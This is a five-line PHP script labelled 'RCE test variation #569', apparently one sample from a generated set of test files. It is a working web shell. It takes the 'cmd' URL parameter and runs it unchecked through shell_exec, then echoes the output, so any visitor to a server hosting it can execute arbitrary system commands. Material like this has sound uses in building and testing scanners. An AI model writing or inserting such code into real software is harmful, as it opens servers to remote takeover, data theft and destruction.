<?php
// RCE test variation #569
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>